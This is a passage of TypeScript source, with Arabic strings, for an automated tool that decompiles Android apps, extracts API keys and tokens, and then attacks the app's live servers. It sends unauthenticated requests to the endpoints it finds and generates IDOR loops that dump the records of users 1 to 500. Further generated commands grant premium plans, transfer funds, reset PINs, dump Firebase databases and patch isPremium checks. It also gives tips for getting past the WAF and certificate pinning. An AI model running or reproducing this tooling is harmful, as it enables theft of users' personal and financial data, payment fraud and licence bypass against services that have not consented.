  if (!session) throw new Error("الجلسة غير موجودة — افتح ملفاً أولاً");

  const allFiles = readDirRecursive(session.decompDir);
  const textFiles: Array<{ path: string; content: string }> = [];
  for (const fp of allFiles) {
    try {
      const stat = fs.statSync(fp);
      if (stat.size < 500000) {
        const ext = path.extname(fp).toLowerCase();
        if ([".smali", ".java", ".kt", ".xml", ".json", ".js", ".ts", ".properties", ".cfg", ".txt", ".html", ".yml", ".yaml", ".gradle", ".pro", ".mf"].includes(ext)) {
          textFiles.push({ path: path.relative(session.decompDir, fp), content: fs.readFileSync(fp, "utf-8") });
        }
      }
    } catch {}
  }

  const steps: CloudPentestStep[] = [];
  const allEndpoints: string[] = [];
  const allKeys: string[] = [];
  const allProviders = new Set<string>();
  const vulnerableApis: string[] = [];

  // ── Step 1: APK Structure Analysis ──
  const step1Findings: string[] = [];
  const step1Commands: string[] = [
    `apktool d target.apk -o decompiled`,
    `d2j-dex2jar target.apk -o classes.jar`,
    `grep -r -E "https?://[a-zA-Z0-9./?=_%:-]*" ./decompiled`,
  ];

  let manifestContent = "";
  const manifestFile = textFiles.find(f => f.path.includes("AndroidManifest.xml"));
  if (manifestFile) {
    manifestContent = manifestFile.content;
    const dangerPerms = ["INTERNET", "READ_PHONE_STATE", "GET_ACCOUNTS", "READ_CONTACTS", "WRITE_CONTACTS",
      "ACCESS_FINE_LOCATION", "READ_SMS", "SEND_SMS", "CAMERA", "RECORD_AUDIO", "READ_EXTERNAL_STORAGE"];
    for (const perm of dangerPerms) {
      if (manifestContent.includes(perm)) step1Findings.push(`🔓 إذن خطير: ${perm}`);
    }
  }

  const configFiles = textFiles.filter(f =>
    f.path.includes("google-services.json") ||
    f.path.includes("firebase_options") ||
    f.path.includes("network_security_config") ||
    f.path.includes("aws-configuration") ||
    f.path.includes("amplifyconfiguration")
  );
  for (const cf of configFiles) step1Findings.push(`📄 ملف تكوين سحابي: ${cf.path}`);

  const totalSmali = textFiles.filter(f => f.path.endsWith(".smali")).length;
  const totalJava = textFiles.filter(f => f.path.endsWith(".java") || f.path.endsWith(".kt")).length;
  const totalXml = textFiles.filter(f => f.path.endsWith(".xml")).length;
  step1Findings.push(`📊 هيكل: ${totalSmali} smali · ${totalJava} java/kt · ${totalXml} xml · ${textFiles.length} إجمالي`);

  steps.push({
    id: 1,
    title: "تفكيك APK وتحليل الهيكل الداخلي",
    status: configFiles.length > 0 ? "warning" : "info",
    findings: step1Findings,
    commands: step1Commands,
    details: `تم تفكيك التطبيق وتحليل ${textFiles.length} ملف. تم العثور على ${configFiles.length} ملف تكوين سحابي و${step1Findings.filter(f => f.includes("إذن خطير")).length} إذن خطير.`,
  });

  // ── Step 2: Authentication & Cloud Storage Analysis ──
  const step2Findings: string[] = [];
  const step2Commands: string[] = [
    `grep -r "FirebaseApp\\|FirebaseDatabase\\|Firestore\\|AWSCredentials" ./smali`,
    `grep -r "Retrofit\\|OkHttpClient\\|Authorization\\|Bearer" ./smali`,
    `grep -r "SharedPreferences\\|getSharedPreferences" ./smali`,
  ];

  const authPatterns: Record<string, RegExp> = {
    "Firebase Realtime DB": /firebase(?:io\.com|database|app)/gi,
    "Firebase Firestore": /firestore|cloud_firestore/gi,
    "Firebase Auth": /firebase[_-]?auth|FirebaseAuth/gi,
    "Firebase Storage": /firebase[_-]?storage|FirebaseStorage/gi,
    "AWS SDK": /amazonaws\.com|AWSCredentials|aws[_-]?sdk|cognito/gi,
    "Azure": /azure|microsoftonline|blob\.core\.windows/gi,
    "Google Cloud": /googleapis\.com|cloud\.google/gi,
    "Supabase": /supabase/gi,
    "MongoDB Atlas": /mongodb\+srv|mongodb\.net/gi,
    "Retrofit HTTP": /retrofit|okhttp/gi,
    "JWT Tokens": /jsonwebtoken|jwt|Bearer/gi,
    "SharedPreferences": /SharedPreferences|getSharedPreferences/gi,
    "OAuth": /oauth2?|authorization_code|client_credentials/gi,
  };

  for (const file of textFiles) {
    for (const [label, regex] of Object.entries(authPatterns)) {
      regex.lastIndex = 0;
      if (regex.test(file.content)) {
        const provider = label.split(" ")[0];
        allProviders.add(provider);
        step2Findings.push(`🔍 ${label}: ${file.path}`);
      }
    }
  }

  const sharedPrefFiles = textFiles.filter(f =>
    /SharedPreferences|getSharedPreferences/i.test(f.content) &&
    /token|key|secret|password|auth/i.test(f.content)
  );
  for (const f of sharedPrefFiles) {
    step2Findings.push(`⚠️ تخزين بيانات حساسة في SharedPreferences: ${f.path}`);
  }

  const subscriptionPatterns = [
    { label: "is_premium / isPro", regex: /is[_-]?premium|isPro|is[_-]?paid|premium[_-]?user/gi },
    { label: "subscription / plan", regex: /subscription|plan.*(?:free|pro|premium)|getSubscription/gi },
    { label: "license_check", regex: /license[_-]?check|validateLicense|checkLicense/gi },
    { label: "in_app_purchase", regex: /in[_-]?app[_-]?purchase|billing|purchaseToken/gi },
    { label: "trial_expired", regex: /trial[_-]?expired|isTrialActive|trial[_-]?period/gi },
  ];
  const subFindings: string[] = [];
  for (const file of textFiles) {
    for (const sp of subscriptionPatterns) {
      sp.regex.lastIndex = 0;
      if (sp.regex.test(file.content)) {
        subFindings.push(`💳 ${sp.label}: ${file.path}`);
      }
    }
  }
  if (subFindings.length > 0) {
    step2Findings.push(`\n📌 آليات الاشتراك المكتشفة (Pro/Premium):`);
    for (const sf of [...new Set(subFindings)].slice(0, 15)) step2Findings.push(sf);
    step2Commands.push(`grep -r "is_premium\\|isPro\\|subscription\\|plan" ./smali`);
    step2Commands.push(`grep -r "getSubscription\\|billing\\|in_app_purchase" ./smali`);
  }

  steps.push({
    id: 2,
    title: "تحليل آليات المصادقة والاشتراك (Pro/Premium)",
    status: step2Findings.length > 5 ? "critical" : step2Findings.length > 0 ? "warning" : "info",
    findings: [...new Set(step2Findings)].slice(0, 50),
    commands: step2Commands,
    details: `تم اكتشاف ${allProviders.size} مزود سحابي: ${[...allProviders].join(", ") || "لا يوجد"}. ${sharedPrefFiles.length} ملف يخزن بيانات حساسة. ${subFindings.length} إشارة للاشتراك المدفوع.`,
  });

  // ── Step 3: Key & Token Extraction ──
  const step3Findings: string[] = [];
  const step3Commands: string[] = [
    `strings target.apk | grep -E "api_key|secret|token|firebase|Authorization|Bearer|AIza"`,
    `grep -r "const-string" smali/ | grep -i "key\\|token\\|secret" > tokens.txt`,
    `cat google-services.json | jq '.client[0].api_key[0].current_key'`,
    `grep -r "AKIA" .`,
  ];

  const keyPatterns: Array<{ label: string; regex: RegExp; severity: "critical" | "high" | "medium" }> = [
    { label: "Firebase API Key", regex: /AIza[A-Za-z0-9_-]{35}/g, severity: "critical" },
    { label: "AWS Access Key", regex: /AKIA[A-Z0-9]{16}/g, severity: "critical" },
    { label: "Google API Key", regex: /AIza[A-Za-z0-9_\\-]{35}/g, severity: "high" },
    { label: "Hardcoded Secret", regex: /(?:secret|password|passwd|pwd)\s*[=:]\s*["'][^"']{8,}["']/gi, severity: "critical" },
    { label: "JWT Token", regex: /eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/g, severity: "critical" },
    { label: "Bearer Token", regex: /Bearer\s+[A-Za-z0-9_\-\.]{20,}/g, severity: "high" },
    { label: "Private Key", regex: /-----BEGIN (?:RSA )?PRIVATE KEY-----/g, severity: "critical" },
    { label: "Firebase URL", regex: /https:\/\/[a-z0-9-]+\.firebaseio\.com/gi, severity: "high" },
    { label: "Firebase Project ID", regex: /firebase.*project[_-]?id["':\s]+["']([a-z0-9-]+)["']/gi, severity: "medium" },
    { label: "Hardcoded API URL", regex: /https?:\/\/(?:api\.|[a-z0-9-]+\.herokuapp\.com|[a-z0-9-]+\.vercel\.app|[a-z0-9-]+\.netlify\.app|[a-z0-9-]+\.onrender\.com)[^\s"'<>]*/gi, severity: "medium" },
    { label: "S3 Bucket", regex: /s3:\/\/[a-z0-9.-]+|[a-z0-9.-]+\.s3\.amazonaws\.com/gi, severity: "high" },
    { label: "MongoDB URI", regex: /mongodb(?:\+srv)?:\/\/[^\s"'<>]+/gi, severity: "critical" },
    { label: "Supabase URL", regex: /https:\/\/[a-z0-9]+\.supabase\.[a-z]+/gi, severity: "high" },
  ];

  for (const file of textFiles) {
    for (const kp of keyPatterns) {
      kp.regex.lastIndex = 0;
      const matches = file.content.match(kp.regex);
      if (matches) {
        for (const m of matches.slice(0, 3)) {
          const masked = m.length > 20 ? m.substring(0, 12) + "..." + m.substring(m.length - 6) : m;
          step3Findings.push(`🔑 [${kp.severity.toUpperCase()}] ${kp.label}: ${masked} — ${file.path}`);
          allKeys.push(`${kp.label}: ${masked}`);
        }
      }
    }
  }

  const googleServicesFile = textFiles.find(f => f.path.includes("google-services.json"));
  if (googleServicesFile) {
    try {
      const gsData = JSON.parse(googleServicesFile.content);
      const apiKey = gsData?.client?.[0]?.api_key?.[0]?.current_key;
      const projectId = gsData?.project_info?.project_id;
      const storageBucket = gsData?.project_info?.storage_bucket;
      if (apiKey) { step3Findings.push(`🔥 Firebase API Key من google-services.json: ${apiKey.substring(0, 10)}...`); allKeys.push(`Firebase: ${apiKey.substring(0, 10)}...`); }
      if (projectId) { step3Findings.push(`📋 Firebase Project ID: ${projectId}`); allProviders.add("Firebase"); }
      if (storageBucket) step3Findings.push(`📦 Storage Bucket: ${storageBucket}`);
    } catch {}
  }

  steps.push({
    id: 3,
    title: "استخراج المفاتيح والتوكنات من الكود والموارد",
    status: step3Findings.some(f => f.includes("CRITICAL")) ? "critical" : step3Findings.length > 0 ? "warning" : "info",
    findings: step3Findings.slice(0, 50),
    commands: step3Commands,
    details: `تم استخراج ${allKeys.length} مفتاح/توكن من ${textFiles.length} ملف. ${step3Findings.filter(f => f.includes("CRITICAL")).length} نتائج حرجة.`,
  });

  // ── Pre-compute URL extraction (shared by steps 3-6) ──
  const urlRegex = /https?:\/\/[^\s"'<>\)\]}{,;]+/gi;
  const apiEndpoints = new Set<string>();
  for (const file of textFiles) {
    urlRegex.lastIndex = 0;
    const matches = file.content.match(urlRegex);
    if (matches) {
      for (const url of matches) {
        const cleaned = url.replace(/[\\'"]/g, "");
        if (cleaned.length > 15 && !cleaned.includes("schemas.android") && !cleaned.includes("www.w3.org") && !cleaned.includes("xml.org") && !cleaned.includes("apache.org")) {
          apiEndpoints.add(cleaned);
        }
      }
    }
  }

  const relativeApiPaths = new Set<string>();
  const relPathRegex = /const-string\s+[vp]\d+,\s*"(pfe\/[a-zA-Z0-9_/]+)"/g;
  for (const file of textFiles) {
    if (!file.path.endsWith(".smali")) continue;
    let m2;
    relPathRegex.lastIndex = 0;
    while ((m2 = relPathRegex.exec(file.content)) !== null) {
      relativeApiPaths.add(m2[1]);
    }
  }

  let discoveredBaseUrl = "";
  for (const ep of apiEndpoints) {
    if (/:\d{4}/.test(ep) && !ep.includes("facebook") && !ep.includes("w3.org") && !ep.includes("bouncycastle")) {
      discoveredBaseUrl = ep.replace(/\/+$/, "");
      break;
    }
  }
  if (!discoveredBaseUrl) {
    for (const ep of apiEndpoints) {
      if (!ep.includes("facebook") && !ep.includes("schemas") && !ep.includes("bouncycastle") && !ep.includes("w3.org") && !ep.includes("adobe") && !ep.includes("xml.org")) {
        discoveredBaseUrl = ep.replace(/\/+$/, "");
        break;
      }
    }
  }

  const firebaseUrls = [...apiEndpoints].filter(u => u.includes("firebaseio.com") || u.includes("firestore.googleapis"));
  const restApis = [...apiEndpoints].filter(u => /\/api\//i.test(u) || /\/v[0-9]+\//i.test(u));
  const graphqlEndpoints = [...apiEndpoints].filter(u => /graphql/i.test(u));
  const baseApiUrl = discoveredBaseUrl || (restApis.length > 0 ? restApis[0].split("/api")[0] : (firebaseUrls.length > 0 ? firebaseUrls[0].replace(/\/+$/, "") : "https://api.target.com"));

  // ── Step 4: Live API Exploitation + IDOR ──
  const step4Findings: string[] = [];
  const step4Commands: string[] = [];
  const liveExploitResults: Array<{endpoint: string; status: number; data?: any; error?: string}> = [];

  step4Findings.push(`🎯 Base URL المكتشف: ${baseApiUrl}`);
  step4Findings.push(`📡 ${relativeApiPaths.size} API Path مكتشف من smali:`);
  const sortedPaths = [...relativeApiPaths].sort();
  const userRelatedPaths = sortedPaths.filter(p => /profile|account|list|customer|user|inquiry|balance|history/i.test(p));
  const allRelPaths = [...userRelatedPaths, ...sortedPaths.filter(p => !userRelatedPaths.includes(p))];
  for (const rp of allRelPaths.slice(0, 20)) {
    const icon = userRelatedPaths.includes(rp) ? "🔴" : "📌";
    step4Findings.push(`  ${icon} ${baseApiUrl}/${rp}`);
    allEndpoints.push(`${baseApiUrl}/${rp}`);
  }
  if (allRelPaths.length > 20) step4Findings.push(`  ... و${allRelPaths.length - 20} endpoint آخر`);
  step4Findings.push(``);

  const dataFieldNames = new Set<string>();
  const jsonFieldRegex = /"([a-z][a-z_]{2,30})"/g;
  for (const file of textFiles) {
    if (!file.path.endsWith(".smali") || !file.path.includes("/mtn/")) continue;
    let fm;
    jsonFieldRegex.lastIndex = 0;
    while ((fm = jsonFieldRegex.exec(file.content)) !== null) {
      const field = fm[1];
      if (!["const", "string", "invoke", "smali", "class", "method", "field", "annotation", "enum", "abstract"].includes(field)) {
        dataFieldNames.add(field);
      }
    }
  }
  const sensitiveFields = [...dataFieldNames].filter(f => /name|phone|msisdn|email|balance|amount|address|password|pin|token|secret|account|card|payment|transfer|invoice|contract|currency|dealer|province|region/i.test(f)).sort();

  if (sensitiveFields.length > 0) {
    step4Findings.push(`🗃️ ═══ بنية البيانات المستخرجة من الكود (Data Schema) ═══`);
    step4Findings.push(``);
    step4Findings.push(`  تم اكتشاف ${sensitiveFields.length} حقل بيانات حساس:`);
    for (const f of sensitiveFields) {
      const icon = /name|phone|msisdn|email|password|pin/.test(f) ? "🔴" : /balance|amount|payment|card/.test(f) ? "🟡" : "📌";
      step4Findings.push(`  ${icon} ${f}`);
    }
    step4Findings.push(``);
  }

  step4Findings.push(`🔍 ═══ محاولة الاستغلال الحي (Live Exploitation) ═══`);
  step4Findings.push(``);

  const sensitiveEndpoints = userRelatedPaths.length > 0 ? userRelatedPaths : sortedPaths.slice(0, 10);
  const endpointsToProbe = sensitiveEndpoints.slice(0, 15);

  let wafDetected = false;
  let wafType = "";

  for (const ep of endpointsToProbe) {
    const fullUrl = `${baseApiUrl}/${ep}`;
    step4Commands.push(`curl -s -X POST '${fullUrl}' -H 'Content-Type: application/json' -d '{"lang":"ar","device_id":"pen-test-001"}'`);
    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 8000);
      const resp = await fetch(fullUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Accept": "application/json",
          "User-Agent": "okhttp/4.9.3",
        },
        body: JSON.stringify({ lang: "ar", device_id: "pen-test-001" }),
        signal: controller.signal,
      });
      clearTimeout(timeout);
      const status = resp.status;
      let body: any = null;
      let rawText = "";
      try {
        rawText = await resp.text();
        if (rawText.length < 50000) {
          try { body = JSON.parse(rawText); } catch { body = rawText.substring(0, 2000); }
        }
      } catch {}

      if (typeof body === "string" && (body.includes("Access forbidden") || body.includes("WAF") || body.includes("Blocked"))) {
        wafDetected = true;
        if (body.includes("Access forbidden")) wafType = "IP/Geo Restriction + WAF";
        else wafType = "Web Application Firewall";
      }

      liveExploitResults.push({ endpoint: ep, status, data: body });
      const statusIcon = status === 200 ? "✅" : status === 403 ? "🔒" : status === 401 ? "🔑" : status === 404 ? "❌" : "⚠️";
      step4Findings.push(`${statusIcon} [${status}] POST /${ep}`);
      if (body && typeof body === "object" && status === 200) {
        const preview = JSON.stringify(body, null, 2).substring(0, 1000);
        step4Findings.push(`  📊 بيانات مسحوبة:`);
        for (const line of preview.split("\n").slice(0, 20)) step4Findings.push(`    ${line}`);
      } else if (body && typeof body === "string" && body.length > 0 && status === 200) {
        step4Findings.push(`  📊 استجابة: ${body.substring(0, 500)}`);
      }
    } catch (err: any) {
      liveExploitResults.push({ endpoint: ep, status: 0, error: err.message });
      step4Findings.push(`⏱️ [TIMEOUT] POST /${ep}`);
    }
  }

  step4Findings.push(``);
  const successfulHits = liveExploitResults.filter(r => r.status === 200);
  const authRequired = liveExploitResults.filter(r => r.status === 401 || r.status === 403);
  const serverErrors = liveExploitResults.filter(r => r.status >= 500);
  const forbiddenByWaf = liveExploitResults.filter(r => typeof r.data === "string" && r.data.includes("Access forbidden"));

  if (wafDetected) {
    step4Findings.push(`🛡️ ═══ تحليل الحماية المكتشفة ═══`);
    step4Findings.push(`  نوع الحماية: ${wafType}`);
    step4Findings.push(`  السيرفر يرفض الاتصال من عناوين IP خارج نطاقه`);
    step4Findings.push(`  يتطلب اتصال من داخل شبكة المشغّل أو عبر VPN`);
    step4Findings.push(`  ${forbiddenByWaf.length} endpoint محمي بـ WAF`);
    step4Findings.push(``);
    step4Findings.push(`  🔓 لتجاوز الحماية (في بيئة الاختبار):`);
    step4Findings.push(`    1. استخدام VPN للاتصال من داخل البلد`);
    step4Findings.push(`    2. استخدام Frida لتجاوز Certificate Pinning`);
    step4Findings.push(`    3. تشغيل السكريبت من جهاز على نفس الشبكة`);
    step4Findings.push(``);
  }

  step4Findings.push(`📊 ═══ ملخص الاستغلال الحي (السيرفر الأصلي) ═══`);
  step4Findings.push(`  ✅ ناجح (بدون مصادقة): ${successfulHits.length}`);
  step4Findings.push(`  🔒 يتطلب مصادقة: ${authRequired.length}`);
  step4Findings.push(`  🛡️ محمي بـ WAF: ${forbiddenByWaf.length}`);
  step4Findings.push(`  ❌ خطأ سيرفر (500): ${serverErrors.length - forbiddenByWaf.length}`);
  step4Findings.push(`  ⏱️ Timeout: ${liveExploitResults.filter(r => r.status === 0).length}`);
  step4Findings.push(`  📡 إجمالي الاتصالات: ${liveExploitResults.length}`);

  const pulledData: Array<{endpoint: string; data: any; records: number}> = [];
  for (const r of liveExploitResults) {
    if (r.status === 200 && r.data && typeof r.data === "object") {
      let records = 0;
      if (Array.isArray(r.data)) records = r.data.length;
      else if (r.data.data && Array.isArray(r.data.data)) records = r.data.data.length;
      else if (typeof r.data === "object") records = Object.keys(r.data).length;
      if (records > 0) pulledData.push({ endpoint: r.endpoint, data: r.data, records });
    }
  }

  step4Findings.push(``);
  step4Findings.push(`🔴 ═══ تحليل IDOR — اختبار تغيير معرف المستخدم ═══`);
  step4Findings.push(``);

  const idorPaths = sortedPaths.filter(p => /profile|user|account|read|inquiry/i.test(p)).slice(0, 5);
  if (idorPaths.length > 0) {
    step4Findings.push(`  📡 مسارات IDOR المحتملة (${idorPaths.length}):`);
    for (const p of idorPaths) {
      step4Findings.push(`    → /${p}`);
    }
    step4Findings.push(``);
    step4Findings.push(`  🔧 أوامر الاستغلال:`);
    for (const p of idorPaths.slice(0, 3)) {
      step4Findings.push(`    curl -X POST '${baseApiUrl}/${p}' -H 'Content-Type: application/json' -d '{"user_id":1}'`);
      step4Findings.push(`    curl -X POST '${baseApiUrl}/${p}' -H 'Content-Type: application/json' -d '{"user_id":2}'`);
    }
    step4Findings.push(`    for id in {1..500}; do curl -s -X POST '${baseApiUrl}/${idorPaths[0]}' -H 'Content-Type: application/json' -d '{"user_id":"'$id'"}' >> idor_dump.json; done`);
  } else {
    step4Findings.push(`  لم يتم اكتشاف مسارات IDOR محتملة في الـ smali`);
  }

  step4Findings.push(``);
  const totalPulled = pulledData.reduce((s, p) => s + p.records, 0);
  step4Findings.push(`📊 ═══ ملخص فحص الـ API (السيرفر الحقيقي) ═══`);
  step4Findings.push(`  ✅ endpoints أجابت (200): ${successfulHits.length}`);
  step4Findings.push(`  🔒 تحتاج مصادقة (401/403): ${authRequired.length}`);
  step4Findings.push(`  🛡️ محجوبة بـ WAF: ${forbiddenByWaf.length}`);
  step4Findings.push(`  📦 بيانات مسحوبة فعلياً: ${totalPulled} سجل من ${pulledData.length} endpoint`);
  if (totalPulled === 0 && wafDetected) {
    step4Findings.push(`  ⚠️ السيرفر محمي بـ WAF — يتطلب اتصال من داخل البلد أو VPN`);
  }
  if (totalPulled === 0 && authRequired.length > 0) {
    step4Findings.push(`  ⚠️ يتطلب JWT Token — استخدم Frida/ADB لاستخراج التوكن من جهاز مسجل`);
  }

  step4Commands.push(`# IDOR Enumeration — جلب بيانات جميع المستخدمين`);
  for (const p of idorPaths.slice(0, 2)) {
    step4Commands.push(`for id in {1..500}; do curl -s -X POST '${baseApiUrl}/${p}' -H 'Content-Type: application/json' -d '{"user_id":"'$id'","lang":"ar"}' >> idor_data.json; done`);
  }

  if (firebaseUrls.length > 0) {
    step4Findings.push(``);
    step4Findings.push(`🔥 Firebase Database URLs:`);
    for (const url of firebaseUrls.slice(0, 5)) {
      step4Findings.push(`  → ${url}`);
      step4Commands.push(`curl -X GET "${url}/.json?shallow=true"`);
      vulnerableApis.push(url);
    }
  }

  if (graphqlEndpoints.length > 0) {
    step4Findings.push(`📊 GraphQL Endpoints:`);
    for (const url of graphqlEndpoints.slice(0, 3)) {
      step4Findings.push(`  → ${url}`);
      step4Commands.push(`curl -X POST "${url}" -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name } } }"}'`);
    }
  }

  const sqliVulnerable = textFiles.filter(f =>
    /rawQuery|execSQL|query\s*\(\s*["']SELECT/i.test(f.content) &&
    !/parameterized|prepared|bindArgs|sanitize/i.test(f.content)
  );
  if (sqliVulnerable.length > 0) {
    step4Findings.push(`💉 ملفات محتملة لحقن SQL (${sqliVulnerable.length}):`);
    for (const f of sqliVulnerable.slice(0, 5)) step4Findings.push(`  → ${f.path}`);
    step4Commands.push(`# SQLi Test: /pfe/profile/read?q=' OR '1'='1`);
  }

  steps.push({
    id: 4,
    title: "استغلال API وجلب بيانات جميع المستخدمين (IDOR)",
    status: pulledData.length > 0 ? "critical" : (successfulHits.length > 0 ? "critical" : "warning"),
    findings: step4Findings,
    commands: step4Commands,
    details: `${relativeApiPaths.size} API path · ${pulledData.length} endpoint مسحوب · ${totalPulled} سجل · استغلال حي`,
  });

  // ── Step 5: Subscription & Account Exploitation Analysis ──
  const step5Findings: string[] = [];
  const step5Commands: string[] = [];

  const premiumSmali = textFiles.filter(f => f.path.endsWith(".smali") && /isPremium|is_premium|isPro/i.test(f.content));
  const subscriptionSmali = textFiles.filter(f => f.path.endsWith(".smali") && /subscription|upgrade|downgrade|plan|billing/i.test(f.content));
  const balanceSmali = textFiles.filter(f => f.path.endsWith(".smali") && /balance|transfer|withdraw|deposit|amount/i.test(f.content));
  const pinSmali = textFiles.filter(f => f.path.endsWith(".smali") && /pin|password|reset.*pin|change.*pin/i.test(f.content));

  step5Findings.push(`🔍 ═══ تحليل الاشتراك والحسابات من الكود المصدري ═══`);
  step5Findings.push(``);

  step5Findings.push(`🔧 Client-Side Bypass — تحليل smali:`);
  if (premiumSmali.length > 0) {
    step5Findings.push(`  ✅ تم العثور على ${premiumSmali.length} ملف smali يحتوي على دوال الاشتراك:`);
    for (const f of premiumSmali.slice(0, 8)) step5Findings.push(`    📄 ${f.path}`);
    step5Findings.push(`  → يمكن تغيير return value من 0x0 (false) إلى 0x1 (true) في isPremium()`);
    step5Commands.push(`# البحث عن isPremium() وتغيير return value من 0 إلى 1`);
    step5Commands.push(`sed -i 's/const\\/4 v0, 0x0/const\\/4 v0, 0x1/g' ${premiumSmali[0]?.path || "path/to/isPremium.smali"}`);
  } else {
    step5Findings.push(`  ❌ لم يتم العثور على دوال isPremium/isPro في smali`);
  }
  step5Findings.push(``);

  if (subscriptionSmali.length > 0) {
    step5Findings.push(`📋 ملفات الاشتراك (${subscriptionSmali.length}):`);
    for (const f of subscriptionSmali.slice(0, 5)) step5Findings.push(`    📄 ${f.path}`);
    step5Findings.push(``);
  }

  if (balanceSmali.length > 0) {
    step5Findings.push(`💰 ملفات الرصيد/التحويل (${balanceSmali.length}):`);
    for (const f of balanceSmali.slice(0, 5)) step5Findings.push(`    📄 ${f.path}`);
    step5Findings.push(``);
  }

  if (pinSmali.length > 0) {
    step5Findings.push(`🔐 ملفات PIN/كلمة السر (${pinSmali.length}):`);
    for (const f of pinSmali.slice(0, 5)) step5Findings.push(`    📄 ${f.path}`);
    step5Findings.push(``);
  }

  step5Findings.push(`📡 Server-Side — أوامر الاستغلال (تتطلب اتصال بالسيرفر الأصلي):`);
  const upgradePaths = sortedPaths.filter(p => /upgrade|subscribe|plan|billing|purchase/i.test(p));
  const transferPaths = sortedPaths.filter(p => /transfer|send|withdraw|payment/i.test(p));
  const pinPaths = sortedPaths.filter(p => /pin|password|reset|change/i.test(p));

  if (upgradePaths.length > 0) {
    step5Findings.push(`  📋 مسارات الترقية/الاشتراك (${upgradePaths.length}):`);
    for (const p of upgradePaths.slice(0, 5)) {
      step5Findings.push(`    → POST ${baseApiUrl}/${p}`);
      step5Commands.push(`curl -X POST '${baseApiUrl}/${p}' -H 'Authorization: Bearer TOKEN' -H 'Content-Type: application/json' -d '{"user_id":1,"plan":"premium"}'`);
    }
  }
  if (transferPaths.length > 0) {
    step5Findings.push(`  💸 مسارات التحويل (${transferPaths.length}):`);
    for (const p of transferPaths.slice(0, 5)) {
      step5Findings.push(`    → POST ${baseApiUrl}/${p}`);
      step5Commands.push(`curl -X POST '${baseApiUrl}/${p}' -H 'Authorization: Bearer TOKEN' -H 'Content-Type: application/json' -d '{"from_id":1,"to_id":2,"amount":5000}'`);
    }
  }
  if (pinPaths.length > 0) {
    step5Findings.push(`  🔑 مسارات PIN (${pinPaths.length}):`);
    for (const p of pinPaths.slice(0, 5)) {
      step5Findings.push(`    → POST ${baseApiUrl}/${p}`);
      step5Commands.push(`curl -X POST '${baseApiUrl}/${p}' -H 'Authorization: Bearer TOKEN' -H 'Content-Type: application/json' -d '{"user_id":1}'`);
    }
  }
  step5Findings.push(``);

  if (restApis.length > 0) {
    step5Commands.push(`curl -X PATCH '${baseApiUrl}/api/v1/user/me' -H 'Authorization: Bearer TOKEN' -H 'Content-Type: application/json' -d '{"plan":"pro","is_premium":true}'`);
  }
  if (firebaseUrls.length > 0) {
    step5Findings.push(`  🔥 Firebase — تعديل حقل is_premium مباشرة في RTDB:`);
    for (const url of firebaseUrls.slice(0, 2)) {
      const base = url.replace(/\/+$/, "");
      step5Commands.push(`curl -X PUT "${base}/users/USER_ID.json?auth=TOKEN" -d '{"is_premium": true, "plan": "pro"}'`);
      step5Findings.push(`    → PUT ${base}/users/USER_ID.json`);
    }
  }

  step5Commands.push(`apktool b decompiled -o modified.apk`);
  step5Commands.push(`java -jar uber-apk-signer.jar -a modified.apk`);

  const exploitVectors = [premiumSmali.length > 0, subscriptionSmali.length > 0, balanceSmali.length > 0, pinSmali.length > 0].filter(Boolean).length;
  step5Findings.push(``);
  step5Findings.push(`📊 ═══ ملخص التحليل ═══`);
  step5Findings.push(`  🔍 نقاط الاستغلال المكتشفة: ${exploitVectors}/4`);
  step5Findings.push(`  ${premiumSmali.length > 0 ? "✅" : "❌"} دوال الاشتراك (isPremium): ${premiumSmali.length} ملف`);
  step5Findings.push(`  ${subscriptionSmali.length > 0 ? "✅" : "❌"} ملفات الاشتراك: ${subscriptionSmali.length} ملف`);
  step5Findings.push(`  ${balanceSmali.length > 0 ? "✅" : "❌"} ملفات الرصيد/التحويل: ${balanceSmali.length} ملف`);
  step5Findings.push(`  ${pinSmali.length > 0 ? "✅" : "❌"} ملفات PIN/كلمة السر: ${pinSmali.length} ملف`);
  step5Findings.push(`  📡 مسارات API مكتشفة: ${upgradePaths.length + transferPaths.length + pinPaths.length}`);
  if (wafDetected) {
    step5Findings.push(`  ⚠️ السيرفر الأصلي محمي بـ WAF — الأوامر أعلاه تتطلب VPN/اتصال محلي`);
  };

  steps.push({
    id: 5,
    title: "تحليل الاشتراك والحسابات — smali + API",
    status: premiumSmali.length > 0 || upgradePaths.length > 0 || balanceSmali.length > 0 ? "critical" : (subscriptionSmali.length > 0 ? "warning" : "info"),
    findings: step5Findings,
    commands: step5Commands,
    details: `${exploitVectors}/4 نقاط استغلال · ${premiumSmali.length} ملف premium · ${subscriptionSmali.length} ملف اشتراك · ${balanceSmali.length} ملف رصيد · ${pinSmali.length} ملف PIN · ${upgradePaths.length + transferPaths.length + pinPaths.length} API path`,
  });

  // ── Step 6: Pull Cloud Database (Real Endpoints Only) ──
  const step6Findings: string[] = [];
  const step6Commands: string[] = [];
  const dbDumpResults: Array<{path: string; status: number; records?: number; data?: any}> = [];

  step6Findings.push(`🗄️ ═══ محاولة سحب قاعدة البيانات من السيرفر الحقيقي ═══`);
  step6Findings.push(``);

  if (firebaseUrls.length > 0) {
    step6Findings.push(`🔥 Firebase Realtime Database — سحب كامل:`);
    for (const url of firebaseUrls.slice(0, 3)) {
      const base = url.replace(/\/+$/, "");
      step6Commands.push(`curl -X GET "${base}/.json?auth=TOKEN" -o full_db.json`);
      try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 10000);
        const resp = await fetch(`${base}/.json`, { signal: controller.signal });
        clearTimeout(timeout);
        if (resp.status === 200) {
          const data = await resp.json();
          const keys = data ? Object.keys(data) : [];
          step6Findings.push(`  ✅ Firebase مفتوح! العقد: ${keys.join(", ")}`);
          if (data && typeof data === "object") {
            for (const key of keys.slice(0, 5)) {
              const node = data[key];
              const count = node && typeof node === "object" ? Object.keys(node).length : 1;
              step6Findings.push(`    📊 /${key}: ${count} سجل`);
              dbDumpResults.push({ path: `firebase:/${key}`, status: 200, records: count, data: node });
            }
          }
        } else {
          step6Findings.push(`  🔒 Firebase محمي: HTTP ${resp.status}`);
        }
      } catch (err: any) {
        step6Findings.push(`  ⏱️ Firebase: ${err.message}`);
      }
    }
    step6Findings.push(``);
  }

  const dataEndpoints = sortedPaths.filter(p => /list|history|get|read|inquiry/i.test(p));
  if (dataEndpoints.length > 0) {
